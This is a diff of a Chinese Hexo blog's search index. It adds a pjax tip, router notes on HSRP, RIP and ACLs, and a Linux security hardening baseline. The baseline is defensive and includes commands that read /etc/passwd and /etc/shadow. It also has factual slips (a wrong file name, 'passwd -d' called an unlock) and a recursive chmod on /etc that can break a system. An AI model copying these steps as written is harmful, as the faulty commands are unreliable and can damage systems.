@@ -381,6 +381,21 @@
       </tags>
   </entry>
   <entry>
+    <title>解决hexo内嵌js无法加载问题</title>
+    <url>/2025/04/14/%E8%A7%A3%E5%86%B3hexo%E5%86%85%E5%B5%8Cjs%E6%97%A0%E6%B3%95%E5%8A%A0%E8%BD%BD%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>检查网站是否开启了<code>pjax</code><br>查看主题配置文件，搜索关键字<code>pjax</code><br>如果<code>pjax</code>的值为true，则证明开启了，此时若要使得内嵌<code>js</code>在每次访问时都能够执行在<code>js</code>标签上添加<code>data-pjax</code> 属性即可  </p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script data-pjax type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">xxxx</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>bug修复</category>
+        <category>tips</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+        <tag>pjax</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PHP代码执行</title>
     <url>/2025/04/11/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
     <content><![CDATA[<h1 id="PHP-CODE-INJECTION"><a href="#PHP-CODE-INJECTION" class="headerlink" title="PHP CODE INJECTION"></a>PHP CODE INJECTION</h1><p>可以注入PHP代码直接执行的漏洞</p>
@@ -415,9 +430,9 @@
         <category>漏洞原理</category>
       </categories>
       <tags>
+        <tag>漏洞原理</tag>
         <tag>PHP</tag>
         <tag>代码执行</tag>
-        <tag>漏洞原理</tag>
       </tags>
   </entry>
   <entry>
@@ -477,8 +492,8 @@
         <category>漏洞原理</category>
       </categories>
       <tags>
-        <tag>PHP</tag>
         <tag>漏洞原理</tag>
+        <tag>PHP</tag>
         <tag>命令执行</tag>
       </tags>
   </entry>
@@ -535,8 +550,8 @@
       </categories>
       <tags>
         <tag>网络安全</tag>
-        <tag>漏洞原理</tag>
         <tag>ldap</tag>
+        <tag>漏洞原理</tag>
       </tags>
   </entry>
   <entry>
@@ -899,6 +914,45 @@
       </tags>
   </entry>
   <entry>
+    <title>HRSP-浮动路由-RIP-ACL-IPsec</title>
+    <url>/2025/04/10/HRSP-%E6%B5%AE%E5%8A%A8%E8%B7%AF%E7%94%B1-RIP-ACL-IPsec/</url>
+    <content><![CDATA[<h1 id="配置HSRP"><a href="#配置HSRP" class="headerlink" title="配置HSRP"></a>配置HSRP</h1><p>R1(config)#int f0&#x2F;0 &#x2F;&#x2F;内网端口<br>R1(config-if)#standby 1 ip 虚拟ip地址<br>R1(config-if)#standby 1 priority 100<br>R1(config-if)# standby 1 preempt  &#x2F;&#x2F;配置占先权<br>R1(config-if)# standby 1 times 2 8 &#x2F;&#x2F;hello间隔与保持时间 同一hsrp组的时间应一致<br>R1(config-if)# standby 1 track f0&#x2F;1 100 &#x2F;&#x2F;配置端口跟踪<br>R1(config)# spanning-tree vlan 10 root primary<br>R1(config)# spanning-tree vlan 20 root secondary &#x2F;&#x2F;配置生成树实现负载均衡vlan 20走备份路由<br>R2(config)#int f0&#x2F;0 &#x2F;&#x2F;内网端口<br>R2(config-if)#standby 1 ip 虚拟ip地址<br>R2(config-if)#standby 1 priority 195 &#x2F;&#x2F;0-255<br>R2(config-if)# standby 1 preempt &#x2F;&#x2F;设置活跃路由器得占先权，由于从较低优先级别得路由器中取回转发全，回复活跃路由器的角色<br>R2(config-if)# standby 1 times 2 8 &#x2F;&#x2F;hello间隔与保持时间<br>R2(config-if)# standby 1 track f0&#x2F;1 100 &#x2F;&#x2F;配置端口跟踪<br>R2(config)# spanning-tree vlan 10 root primary<br>R2(config)# spanning-tree vlan 20 root secondary &#x2F;&#x2F;配置生成树实现负载均衡vlan 20走备份路由<br>优先级高的路由其作为主路由，优先级低的路由作为备份路由，当主路由发生故障的时候，备份路由由监听状态切换到活跃状态。当优先级相同时，比较端口ip,ip较大的作为活跃路由，如果优先级低的路由<br>已经成为了活跃路由，那么优先级高的路由将作为监听路由，直到活跃路由发生故障。值愈大优先级越高</p>
+<h2 id="hsrp协议组中由6种状态："><a href="#hsrp协议组中由6种状态：" class="headerlink" title="hsrp协议组中由6种状态："></a>hsrp协议组中由6种状态：</h2><p>初始状态：路由器刚启动时，或者配置发生改变时<br>学习状态：路由其等待来自活跃路由器的消息，此时路由器还没有收到来自活跃里尤其的hello消息，也没有学习到虚拟路由器的ip地址<br>监听状态：路由其学习了虚拟的ip地址，但他既不是活跃路由器也不是监听路由器，此时负责监听来自活跃路由器与备份路由器的hello包<br>发言状态：路由器周期性发送hello消息，并参与活跃路由器或者备份路由器的京选<br>备份状态：处于该状态的路由器时下一个活跃路由器的候选设备，其周期性得发送hello包<br>活跃状态：负责转发虚拟路由器得数据包，并周期性得发送hello消息。<br>hello间隔：3s<br>保持间隔10s<br>通产保持间隔要在hello间隔得3倍<br>使用udp协议</p>
+<h2 id="vrrp-虚拟路由冗余协议"><a href="#vrrp-虚拟路由冗余协议" class="headerlink" title="vrrp 虚拟路由冗余协议"></a>vrrp 虚拟路由冗余协议</h2><p>只有初始状态、活跃状态、备份状态三种状态<br>允许vrrp组得设备间建立认证机制</p>
+<h1 id="rip-距离矢量算法，根据跳数来选择路由"><a href="#rip-距离矢量算法，根据跳数来选择路由" class="headerlink" title="rip-距离矢量算法，根据跳数来选择路由"></a>rip-距离矢量算法，根据跳数来选择路由</h1><p>属于内部网关协议igp-有一系列协议族  还有一种时外部网关协议egp-只有一种协议<br>内部网关协议是往往是工作在一个组织实体里面的的路由器之间交换路由信息的协议，组织实体是指像学校、医院之类的实体<br>最大路由跳数为15跳，大于该值的路由被认为不可达</p>
+<p>当更新周期到达时，其向相邻的路由器发送学习到的路由。</p>
+<p>通过更行-update 与请求-requests两种分组来传输信息，更新周期为30s，如果不进行指定默认通过广播的形式更新信息。更新信息包括路由表与跳数两个部分。其并不是绝对根据跳数来选择路由的，同时也会参考网络的带宽。因为rip协议通过相邻路由器来更新路由表所以多网络全局的状况不清除，从而导致了一个慢收敛与不一致的问题。当三个火更多路由器构成环路是路由环路的问题仍会发生，这是需要用到触发更新法</p>
+<p>RIP的水平分割</p>
+<p>既路由器不向路径到来的方向回传此路径。通过将这些路由的跳数设置为16来实现该功能，能及时的解决路由环路的问题</p>
+<p>RIP的保持定时器法</p>
+<p>保持定时器可以防止路由器在路径从路由器从路由表中删除一定时间内（通常为180秒）接受新的路由信息。目的是为了保证每个路由器都收到路由不可达的信息，从而有效得避免了路由环路得产生。</p>
+<p>RIP的触发更新法</p>
+<p>当某个路径的跳数改变了路由器立即发生更新信息，不管路由器是否到达常规信息更新时间都发出更新信息。能够有效得加快路由的收敛时间</p>
+<p>收敛机制</p>
+<p><img src="/2025/04/10/HRSP-%E6%B5%AE%E5%8A%A8%E8%B7%AF%E7%94%B1-RIP-ACL-IPsec/QQ20210329085323.png" referrerpolicy="no-referrer"></p>
+<p>当主机与其直连路由器的链路发生中断时，其立刻向于其相邻的两个路由器发送路由更新信息，如果此时发送到右下路由器的信息发生堵塞延迟，则右上方的路由器先得到更新信息，将旧的到达主机的路由信息丢弃，右下方路由器因为没有收到来自左上路由器的更新信息，继续向右上路由器发送旧的路由信息，右上方路由器收到后又添加一条到达主机的路由。如此循环形成了路由环路。<br>使用udp协议的520端口</p>
+<p>RIP帧格式</p>
+<p><a href="RIP%E5%B8%A7%E6%A0%BC%E5%BC%8F%202019e93eb947495cbb98e4df2efa90c1.csv">RIP帧格式</a></p>
+<p>(config)#router rip<br>(config)#acc 1 deny any<br>(config-router)# network 接口网段<br>(config-router)# network 接口网段<br>(config-router)# passive-interface f0&#x2F;1 &#x2F;&#x2F;配置被动接口，只收不发<br>(config-router)# discribute-list 1 in f0&#x2F;1 &#x2F;&#x2F;配置路由过滤<br>(config-router)# distance 50 &#x2F;&#x2F;配置管理距离值，该值越小路由信息越可靠<br>(config-router)# neigbor 192l.168.1.24 &#x2F;&#x2F;配置邻居路由，以单播的形式发送路由信息</p>
+<h1 id="配置浮动路由"><a href="#配置浮动路由" class="headerlink" title="配置浮动路由"></a>配置浮动路由</h1><p>ip route 网段 掩码 下一跳地址|端口号 70<br>ip route 网段 掩码 下一跳地址|端口号 100 &#x2F;&#x2F;最后一个参数位管理距离，其值越大表示优先级越低</p>
+<h1 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h1><p>配置acl首先要配置内外网端口，配置过滤规则，将规则应用到端口。最后有一条默认拒绝所有。deny any</p>
+<p>ACL包括标准acl 与扩展acl</p>
+<p>标准acl是机与源ip地址进行过滤的 工作在三成 表号1-99</p>
+<p>扩展acl可以通过端口号、协议等进行匹配过滤 国祚在三层与四层 表号 100-199</p>
+<p>一个接口的一个方向只能有一张acl表，数据包一旦被某个rule匹配，就不再向下进行匹配。</p>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>协议规范</category>
+      </categories>
+      <tags>
+        <tag>HRSP</tag>
+        <tag>RIP</tag>
+        <tag>ACL</tag>
+        <tag>IPSec</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HASH表与一致性HASH</title>
     <url>/2025/04/10/HASH%E8%A1%A8%E4%B8%8E%E4%B8%80%E8%87%B4%E6%80%A7HASH/</url>
     <content><![CDATA[<h1 id="HASH表与一致性HASH"><a href="#HASH表与一致性HASH" class="headerlink" title="HASH表与一致性HASH"></a>HASH表与一致性HASH</h1><h1 id="哈希表的基本认识"><a href="#哈希表的基本认识" class="headerlink" title="哈希表的基本认识"></a>哈希表的基本认识</h1><hr>
@@ -1030,45 +1084,6 @@
       <tags>
         <tag>HASH表</tag>
         <tag>一致性HASH</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HRSP-浮动路由-RIP-ACL-IPsec</title>
-    <url>/2025/04/10/HRSP-%E6%B5%AE%E5%8A%A8%E8%B7%AF%E7%94%B1-RIP-ACL-IPsec/</url>
-    <content><![CDATA[<h1 id="配置HSRP"><a href="#配置HSRP" class="headerlink" title="配置HSRP"></a>配置HSRP</h1><p>R1(config)#int f0&#x2F;0 &#x2F;&#x2F;内网端口<br>R1(config-if)#standby 1 ip 虚拟ip地址<br>R1(config-if)#standby 1 priority 100<br>R1(config-if)# standby 1 preempt  &#x2F;&#x2F;配置占先权<br>R1(config-if)# standby 1 times 2 8 &#x2F;&#x2F;hello间隔与保持时间 同一hsrp组的时间应一致<br>R1(config-if)# standby 1 track f0&#x2F;1 100 &#x2F;&#x2F;配置端口跟踪<br>R1(config)# spanning-tree vlan 10 root primary<br>R1(config)# spanning-tree vlan 20 root secondary &#x2F;&#x2F;配置生成树实现负载均衡vlan 20走备份路由<br>R2(config)#int f0&#x2F;0 &#x2F;&#x2F;内网端口<br>R2(config-if)#standby 1 ip 虚拟ip地址<br>R2(config-if)#standby 1 priority 195 &#x2F;&#x2F;0-255<br>R2(config-if)# standby 1 preempt &#x2F;&#x2F;设置活跃路由器得占先权，由于从较低优先级别得路由器中取回转发全，回复活跃路由器的角色<br>R2(config-if)# standby 1 times 2 8 &#x2F;&#x2F;hello间隔与保持时间<br>R2(config-if)# standby 1 track f0&#x2F;1 100 &#x2F;&#x2F;配置端口跟踪<br>R2(config)# spanning-tree vlan 10 root primary<br>R2(config)# spanning-tree vlan 20 root secondary &#x2F;&#x2F;配置生成树实现负载均衡vlan 20走备份路由<br>优先级高的路由其作为主路由，优先级低的路由作为备份路由，当主路由发生故障的时候，备份路由由监听状态切换到活跃状态。当优先级相同时，比较端口ip,ip较大的作为活跃路由，如果优先级低的路由<br>已经成为了活跃路由，那么优先级高的路由将作为监听路由，直到活跃路由发生故障。值愈大优先级越高</p>
-<h2 id="hsrp协议组中由6种状态："><a href="#hsrp协议组中由6种状态：" class="headerlink" title="hsrp协议组中由6种状态："></a>hsrp协议组中由6种状态：</h2><p>初始状态：路由器刚启动时，或者配置发生改变时<br>学习状态：路由其等待来自活跃路由器的消息，此时路由器还没有收到来自活跃里尤其的hello消息，也没有学习到虚拟路由器的ip地址<br>监听状态：路由其学习了虚拟的ip地址，但他既不是活跃路由器也不是监听路由器，此时负责监听来自活跃路由器与备份路由器的hello包<br>发言状态：路由器周期性发送hello消息，并参与活跃路由器或者备份路由器的京选<br>备份状态：处于该状态的路由器时下一个活跃路由器的候选设备，其周期性得发送hello包<br>活跃状态：负责转发虚拟路由器得数据包，并周期性得发送hello消息。<br>hello间隔：3s<br>保持间隔10s<br>通产保持间隔要在hello间隔得3倍<br>使用udp协议</p>
-<h2 id="vrrp-虚拟路由冗余协议"><a href="#vrrp-虚拟路由冗余协议" class="headerlink" title="vrrp 虚拟路由冗余协议"></a>vrrp 虚拟路由冗余协议</h2><p>只有初始状态、活跃状态、备份状态三种状态<br>允许vrrp组得设备间建立认证机制</p>
-<h1 id="rip-距离矢量算法，根据跳数来选择路由"><a href="#rip-距离矢量算法，根据跳数来选择路由" class="headerlink" title="rip-距离矢量算法，根据跳数来选择路由"></a>rip-距离矢量算法，根据跳数来选择路由</h1><p>属于内部网关协议igp-有一系列协议族  还有一种时外部网关协议egp-只有一种协议<br>内部网关协议是往往是工作在一个组织实体里面的的路由器之间交换路由信息的协议，组织实体是指像学校、医院之类的实体<br>最大路由跳数为15跳，大于该值的路由被认为不可达</p>
-<p>当更新周期到达时，其向相邻的路由器发送学习到的路由。</p>
-<p>通过更行-update 与请求-requests两种分组来传输信息，更新周期为30s，如果不进行指定默认通过广播的形式更新信息。更新信息包括路由表与跳数两个部分。其并不是绝对根据跳数来选择路由的，同时也会参考网络的带宽。因为rip协议通过相邻路由器来更新路由表所以多网络全局的状况不清除，从而导致了一个慢收敛与不一致的问题。当三个火更多路由器构成环路是路由环路的问题仍会发生，这是需要用到触发更新法</p>
-<p>RIP的水平分割</p>
-<p>既路由器不向路径到来的方向回传此路径。通过将这些路由的跳数设置为16来实现该功能，能及时的解决路由环路的问题</p>
-<p>RIP的保持定时器法</p>
-<p>保持定时器可以防止路由器在路径从路由器从路由表中删除一定时间内（通常为180秒）接受新的路由信息。目的是为了保证每个路由器都收到路由不可达的信息，从而有效得避免了路由环路得产生。</p>
-<p>RIP的触发更新法</p>
-<p>当某个路径的跳数改变了路由器立即发生更新信息，不管路由器是否到达常规信息更新时间都发出更新信息。能够有效得加快路由的收敛时间</p>
-<p>收敛机制</p>
-<p><img src="/2025/04/10/HRSP-%E6%B5%AE%E5%8A%A8%E8%B7%AF%E7%94%B1-RIP-ACL-IPsec/QQ20210329085323.png" referrerpolicy="no-referrer"></p>
-<p>当主机与其直连路由器的链路发生中断时，其立刻向于其相邻的两个路由器发送路由更新信息，如果此时发送到右下路由器的信息发生堵塞延迟，则右上方的路由器先得到更新信息，将旧的到达主机的路由信息丢弃，右下方路由器因为没有收到来自左上路由器的更新信息，继续向右上路由器发送旧的路由信息，右上方路由器收到后又添加一条到达主机的路由。如此循环形成了路由环路。<br>使用udp协议的520端口</p>
-<p>RIP帧格式</p>
-<p><a href="RIP%E5%B8%A7%E6%A0%BC%E5%BC%8F%202019e93eb947495cbb98e4df2efa90c1.csv">RIP帧格式</a></p>
-<p>(config)#router rip<br>(config)#acc 1 deny any<br>(config-router)# network 接口网段<br>(config-router)# network 接口网段<br>(config-router)# passive-interface f0&#x2F;1 &#x2F;&#x2F;配置被动接口，只收不发<br>(config-router)# discribute-list 1 in f0&#x2F;1 &#x2F;&#x2F;配置路由过滤<br>(config-router)# distance 50 &#x2F;&#x2F;配置管理距离值，该值越小路由信息越可靠<br>(config-router)# neigbor 192l.168.1.24 &#x2F;&#x2F;配置邻居路由，以单播的形式发送路由信息</p>
-<h1 id="配置浮动路由"><a href="#配置浮动路由" class="headerlink" title="配置浮动路由"></a>配置浮动路由</h1><p>ip route 网段 掩码 下一跳地址|端口号 70<br>ip route 网段 掩码 下一跳地址|端口号 100 &#x2F;&#x2F;最后一个参数位管理距离，其值越大表示优先级越低</p>
-<h1 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h1><p>配置acl首先要配置内外网端口，配置过滤规则，将规则应用到端口。最后有一条默认拒绝所有。deny any</p>
-<p>ACL包括标准acl 与扩展acl</p>
-<p>标准acl是机与源ip地址进行过滤的 工作在三成 表号1-99</p>
-<p>扩展acl可以通过端口号、协议等进行匹配过滤 国祚在三层与四层 表号 100-199</p>
-<p>一个接口的一个方向只能有一张acl表，数据包一旦被某个rule匹配，就不再向下进行匹配。</p>
-]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>协议规范</category>
-      </categories>
-      <tags>
-        <tag>HRSP</tag>
-        <tag>RIP</tag>
-        <tag>ACL</tag>
-        <tag>IPSec</tag>
       </tags>
   </entry>
   <entry>
@@ -1887,8 +1902,8 @@
         <category>漏洞原理</category>
       </categories>
       <tags>
-        <tag>PHP</tag>
         <tag>漏洞原理</tag>
+        <tag>PHP</tag>
         <tag>SQL注入</tag>
       </tags>
   </entry>
@@ -1963,6 +1978,45 @@
       <tags>
         <tag>Shell编程</tag>
         <tag>Shell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux安全配置基线</title>
+    <url>/2025/04/10/linux%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E5%9F%BA%E7%BA%BF/</url>
+    <content><![CDATA[<h1 id="linux安全配置基线"><a href="#linux安全配置基线" class="headerlink" title="linux安全配置基线"></a>linux安全配置基线</h1><h1 id="一、共享账号检查"><a href="#一、共享账号检查" class="headerlink" title="一、共享账号检查"></a>一、共享账号检查</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：用户账号分配检查，避免共享账号存在</span><br><span class="line">配置要求：1、系统需按照实际用户分配账号；</span><br><span class="line">          2、避免不同用户间共享账号，避免用户账号和服务器间通信使用的账号共享。</span><br><span class="line">操作指南：参考配置操作：cat /etc/passwd查看当前所有用户的情况；</span><br><span class="line">检查方法：命令cat /etc/passwd查看当前所有用户的信息，与管理员确认是否有共享账号情况存在。</span><br><span class="line">配置方法：如需建立用户，参考如下：</span><br><span class="line">          #useradd username  #创建账号</span><br><span class="line">          #passwd username   #设置密码</span><br><span class="line">          使用该命令为不同的用户分配不同的账号，设置不同的口令及权限信息等。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="二、多余账户锁定"><a href="#二、多余账户锁定" class="headerlink" title="二、多余账户锁定"></a>二、多余账户锁定</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：多余账户锁定策略</span><br><span class="line">配置要求：应锁定与设备运行、维护等工作无关的账号。</span><br><span class="line">操作指南：参考配置操作：</span><br><span class="line">          查看锁定用户：</span><br><span class="line">          # cat /etc/password，查看哪些账户的shell域中为nologin；</span><br><span class="line">检查方法：人工检查：</span><br><span class="line">          	# cat /etc/password后查看多余账户的shell域为nologin为符合；</span><br><span class="line">          BVS基线检查：</span><br><span class="line">          	多余账户处于锁定状态为符合。</span><br><span class="line">配置方法：锁定用户：</span><br><span class="line">        修改/etc/password文件，将需要锁定的用户的shell域设为nologin；</span><br><span class="line">        或通过#passwd –l username锁定账户；</span><br><span class="line">        只有具备超级用户权限的使用者方可使用#passwd –l username锁定用户,用#passwd –d username解锁后原有密码失效，登录需输入新密码。</span><br><span class="line">        补充操作说明：</span><br><span class="line">        一般情况下，需要锁定的用户：lp,nuucp,hpdb,www,demon</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="三、root账户登录控制"><a href="#三、root账户登录控制" class="headerlink" title="三、root账户登录控制"></a>三、root账户登录控制</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：root账户远程登录账户限制</span><br><span class="line">配置要求：1、限制具备超级管理员权限的用户远程登录。</span><br><span class="line">          2、远程执行管理员权限操作，应先以普通权限用户远程登录后，再切换到超级管理员权限账号后执行相应操作。</span><br><span class="line">操作指南：使用root账户远程尝试登陆</span><br><span class="line">检查方法：1、root远程登录不成功，提示“Not on system console”；</span><br><span class="line">         2、普通用户可以登录成功，而且可以切换到root用户；</span><br><span class="line">配置方法：修改/etc/ssh/sshd_config文件，将PermitRootLogin yes改为PermitRootLogin no，重启sshd服务。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="四、口令复杂度要求"><a href="#四、口令复杂度要求" class="headerlink" title="四、口令复杂度要求"></a>四、口令复杂度要求</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：操作系统口令复杂度策略</span><br><span class="line">配置要求：口令长度至少12位，并包括数字、小写字母、大写字母和特殊符号。</span><br><span class="line">操作指南：1、参考配置操作</span><br><span class="line">        # cat /etc/pam.d/system-auth，找到password模块接口的配置部分，找到类似如下的配置行：</span><br><span class="line">        password  requisite  /lib/security/$ISA/pam_cracklib.so minlen =6</span><br><span class="line">        2、补充操作说明</span><br><span class="line">        参数说明如下：</span><br><span class="line">        1、retry=N，确定用户创建密码时允许重试的次数；</span><br><span class="line">        2、minlen=N，确定密码最小长度要求，事实上，在默认配置下，此参数代表密码最小长度为N-1；</span><br><span class="line">        3、dcredit=N，当N小于0时，代表新密码中数字字符数量不得少于（-N）个。例如，dcredit=-2代表密码中要至少包含两个数字字符；</span><br><span class="line">        4、ucredit=N，当N小于0时，代表则新密码中大写字符数量不得少于（-N）个；</span><br><span class="line">        5、lcredit=N，当N小于0时，代表则新密码中小写字符数量不得少于（-N）个；</span><br><span class="line">        6、ocredit=N，当N小于0时，代表则新密码中特殊字符数量不得少于（-N）个；</span><br><span class="line">检查方法：# cat /etc/pam.d/system-auth，参考操作指南检查对应参数</span><br><span class="line">         	口令的最小长度至少12位</span><br><span class="line">         	口令最少应包含的字符数量</span><br><span class="line">         	口令中最少应包含的字母字符数量</span><br><span class="line">         	口令中最少应包含的非字母数字字符数量</span><br><span class="line">         通过以上4子项的输出综合判断该项是否满足。</span><br><span class="line">配置方法：# vi /etc/pam.d/system-auth，找到password模块接口的配置部分，按照配置要求内容修改对应属性。</span><br><span class="line">适用版本：Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="五、口令最长生存期策略"><a href="#五、口令最长生存期策略" class="headerlink" title="五、口令最长生存期策略"></a>五、口令最长生存期策略</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：口令最长生存期策略</span><br><span class="line">配置要求：要求操作系统的账户口令的最长生存期不长于90天</span><br><span class="line">操作指南：# cat /etc/login.defs文件中指定配置项，其中：</span><br><span class="line">          PASS_MAX_DAYS配置项决定密码最长使用期限；</span><br><span class="line">          PASS_MIN_DAYS配置项决定密码最短使用期限；</span><br><span class="line">          PASS_WARN_AGE配置项决定密码到期提醒时间。</span><br><span class="line">检查方法：PASS_MAX_DAYS值小于等于90为符合；</span><br><span class="line">         “对于采用静态口令认证技术的设备，账户口令的生存期不长于90天”项的当前值：表示当前的口令生存期长度。</span><br><span class="line">配置方法：vi /etc/login.defs文件，修改PASS_MAX_DAYS值为小于等于9</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="六、系统关键目录访问权限"><a href="#六、系统关键目录访问权限" class="headerlink" title="六、系统关键目录访问权限"></a>六、系统关键目录访问权限</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：关键目录权限控制</span><br><span class="line">配置要求：根据安全需要，配置某些关键目录其所需的最小权限；</span><br><span class="line">          重点要求password配置文件、shadow文件、group文件权限。</span><br><span class="line">         当前主流版本的linux系统在默认情况下即对重要文件做了必要的权限设置，在日常管理和操作过程中应避免修改此类文件权限，除此以外，</span><br><span class="line">         应定期对权限进行检查及复核，确保权限设置正确。</span><br><span class="line">操作指南：查看关键目录的用户对应权限参考命令</span><br><span class="line">          ls -l /etc/passwd</span><br><span class="line">          ls -l /etc/shadow</span><br><span class="line">          ls -l /etc/group</span><br><span class="line">检查方法：与管理员确认已有权限为最小权限。</span><br><span class="line">配置方法：参考配置操作：</span><br><span class="line">        通过chmod命令对目录的权限进行实际设置。</span><br><span class="line">        补充操作说明：</span><br><span class="line">        	/etc/passwd 所有用户都可读，root用户可写 –rw-r—r— </span><br><span class="line">        配置命令：chmod 644 /etc/passwd</span><br><span class="line">        	/etc/shadow 只有root可读 –r-------- </span><br><span class="line">        配置命令：chmod 600 /etc/shadow；</span><br><span class="line">        	/etc/group 必须所有用户都可读，root用户可写 –rw-r—r—</span><br><span class="line">        配置命令：chmod 644 /etc/group；</span><br><span class="line">        如果是有写权限，就需移去组及其它用户对/etc的写权限（特殊情况除外）执行命令#chmod -R go-w,o-r /etc</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="七、用户缺省权限控制"><a href="#七、用户缺省权限控制" class="headerlink" title="七、用户缺省权限控制"></a>七、用户缺省权限控制</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：用户缺省权限控制</span><br><span class="line">配置要求：控制用户缺省访问权限，当在创建新文件或目录时应屏蔽掉新文件或目录不应有的访问允许权限,防止同属于</span><br><span class="line">该组的其它用户及别的组的用户修改该用户的文件或更高限制。</span><br><span class="line">操作指南：1、# cat /etc/bashrc  查看全局默认设置umask值</span><br><span class="line">          2、查看具体用户home目录下bash_profile，具体用户的umask</span><br><span class="line">检查方法：查看全局默认设置umask值为027或更小权限为符合（如有特许权限需求，可根据实际情况判断）；</span><br><span class="line">          查看具体用户的umask，本着最小权限的原则。</span><br><span class="line">配置方法：参考配置操作：</span><br><span class="line">          单独针对用户设置</span><br><span class="line">          可修改用户home目录下的.bash_profile脚本文件，例如，可增加一条语句：umask 027；对于权限要求较严格的场合，建议设置为077。</span><br><span class="line">          全局默认设置：</span><br><span class="line">          默认通过全局脚本/etc/bashrc设置所有用户的默认umask值，修改脚本即可实现对用户默认umask值的全局性修改，</span><br><span class="line">          通常建议将umask设置为027以上，对于权限要求较严格的场合，建议设置为077。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="八、安全日志完备性要求"><a href="#八、安全日志完备性要求" class="headerlink" title="八、安全日志完备性要求"></a>八、安全日志完备性要求</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：安全日志完备性要求</span><br><span class="line">配置要求：系统应配置完备日志记录，记录对与系统相关的安全事件。</span><br><span class="line">操作指南：1、# cat /etc/syslog.conf查看是否有对应配置</span><br><span class="line">          2、# cat /var/log/secure查看是否有对应配置</span><br><span class="line">检查方法：1、cat /etc/syslog.conf确认有对应配置；</span><br><span class="line">          2、查看/var/log/secure，应记录有需要的设备相关的安全事件。</span><br><span class="line">配置方法：修改配置文件vi /etc/syslog.conf。</span><br><span class="line">          配置如下类似语句：</span><br><span class="line">          authpriv.*			/var/log/secure</span><br><span class="line">          定义为需要保存的设备相关安全事件。</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="九、统一远程日志服务器配置"><a href="#九、统一远程日志服务器配置" class="headerlink" title="九、统一远程日志服务器配置"></a>九、统一远程日志服务器配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：统一远程日志服务器配置</span><br><span class="line">配置要求：当前系统应配置远程日志功能，将需要重点关注的日志内容传输到日志服务器进行备份。</span><br><span class="line">操作指南：# cat /etc/syslog.conf查看是否有对应配置</span><br><span class="line">检查方法：配置了远程日志服务器为符合</span><br><span class="line">配置方法：1、参考配置操作</span><br><span class="line">          修改配置文件vi /etc/syslog.conf，</span><br><span class="line">          加上这一行：</span><br><span class="line">          *.* @192.168.0.1</span><br><span class="line">          可以将&quot;*.*&quot;替换为你实际需要的日志信息。比如：kern.* / mail.* 等等；可以将此处192.168.0.1替换为实际的IP或域名。</span><br><span class="line">          重新启动syslog服务，执行下列命令：</span><br><span class="line">          services syslogd restart</span><br><span class="line">          2、补充操作说明</span><br><span class="line">          注意：*.*和@之间为一个Tab</span><br><span class="line">适用版本：Linux Redhat AS 3、Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
+<h1 id="十、设置history时间戳"><a href="#十、设置history时间戳" class="headerlink" title="十、设置history时间戳"></a>十、设置history时间戳</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置名称：设置history时间戳</span><br><span class="line">配置要求：配置history时间戳，便于审计。</span><br><span class="line">操作指南：# cat /etc/bashrc查看是否有对应配置</span><br><span class="line">检查方法：已添加，如：“export HISTTIMEFORMAT=&quot;%F %T”配置为符合。</span><br><span class="line">配置方法：参考配置操作：</span><br><span class="line">          在/etc/bashrc文件中增加如下行：</span><br><span class="line">          export HISTTIMEFORMAT=&quot;%F %T</span><br><span class="line">适用版本：Linux Redhat AS 4</span><br></pre></td></tr></table></figure>
+
